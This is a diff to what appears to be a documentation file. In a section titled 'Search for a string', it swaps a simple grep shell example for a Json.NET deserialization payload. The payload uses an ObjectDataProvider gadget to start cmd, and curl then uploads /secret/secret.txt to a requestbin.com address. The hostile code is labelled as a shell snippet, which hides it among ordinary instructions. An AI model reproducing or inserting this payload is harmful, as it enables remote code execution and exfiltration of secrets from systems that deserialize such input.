@@ -15,9 +15,15 @@
 
 ## Search for a string
 ```sh
-#!/bin/sh
-
-grep -r "hede" * 2>/dev/null
+{
+    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName":"Start",
+    "MethodParameters":{
+        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "$values":["cmd","/ccurl -d @/secret/secret.txt https://requestbin.com/r/esr1gp03vq0f"]
+    },
+    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
+}
 ```
 #####
 
